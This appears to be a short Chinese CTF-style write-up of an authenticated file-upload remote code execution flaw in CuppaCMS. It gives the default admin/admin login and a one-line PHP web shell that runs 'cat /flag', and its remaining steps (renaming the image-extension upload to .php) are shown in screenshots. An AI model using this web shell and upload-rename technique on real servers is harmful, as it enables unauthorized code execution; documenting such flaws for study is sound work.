## 1. 漏洞介绍

CuppaCMS是一套内容管理系统（CMS）。 CuppaCMS 2019-11-12之前版本存在安全漏洞，攻击者可利用该漏洞在图像扩展内上传恶意文件，通过使用文件管理器提供的重命名函数的自定义请求，可以将图像扩展修改为PHP，从而导致远程任意代码执行。

[Authenticated Remote code Execution · Issue #7 · CuppaCMS/CuppaCMS · GitHub](https://github.com/CuppaCMS/CuppaCMS/issues/7)

## 2. 漏洞复现

登录：admin/admin

上传图片格式的shell，示例

```PHP
<?php system("cat /flag");?>
```

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202401022336064.png)

抓包改后缀

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202401022337611.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202401022337707.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202401022337547.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202401022337549.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202401022337550.png)
